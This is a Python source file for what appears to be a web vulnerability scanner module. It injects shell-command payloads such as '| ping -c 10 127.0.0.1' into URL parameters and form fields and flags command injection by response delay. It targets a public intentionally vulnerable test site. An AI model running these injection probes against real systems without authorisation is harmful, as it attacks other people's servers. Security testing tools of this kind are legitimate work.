import urllib.parse
import requests
from urllib.parse import urlparse, parse_qs
import validators
from forms import forms


class CommandInjection:
    payloads = ["& ping -c 10 127.0.0.1 & ", "| ping -c 10 127.0.0.1"]
    possible_Responses = []
    test_String = "Appknockz"

    def __init__(self, url, cookies=None, headers=None, timeout=3):
        self.url = url
        self.cookies = cookies
        self.headers = headers
        self.timeout = timeout

    def check_url(self):
        return validators.url(self.url)

    def has_parameters(self):
        if self.check_url():
            parsed_url = urlparse(self.url)
            query = parsed_url.query
            parameters = parse_qs(query)
            if bool(parameters) is False and parameters is not None:
                return False
            else:
                return True
        else:
            print("Provided URL is not valid")
            exit(0)

    def inject_url(self):
        if self.has_parameters():
            parsed_url = urlparse(self.url)
            parameters = parse_qs(parsed_url.query)
            # Data formatting
            for parameter in parameters:
                parameters[parameter] = parameters[parameter][0]

            for parameter in parameters:
                for P in CommandInjection.payloads:
                    current_value = parameters[parameter]
                    parameters[parameter] = P
                    new_values = list(parsed_url)
                    new_values[4] = urllib.parse.urlencode(parameters)
                    build_url = urllib.parse.urlunparse(new_values)
                    data = requests.get(build_url)

                    if (data.status_code == 200 and CommandInjection.test_String in data.text) \
                            or data.elapsed.total_seconds() >= self.timeout:
                        if CommandInjection.test_String in data.text:
                            print("There is code Injection")

                parameters[parameter] = current_value

    def inject_forms(self):
        formlist = forms.get_forms(self.url, cookies=self.cookies)
        for form in formlist:
            for P in CommandInjection.payloads:
                resp = forms.submit(self.url, form_specs=form, payload=P, cookies=self.cookies, getContent=False)[0]
                if resp.elapsed.total_seconds() > self.timeout:
                    print("[ +++ ] Command Injection at this form : {0} on this enpoint : {1}".format(form, self.url))


if __name__ == '__main__':
    Injector = CommandInjection("http://testphp.vulnweb.com/search.php?test=query&dummy=test",
                                cookies={"login": "test/test"})
    Injector.inject_forms()
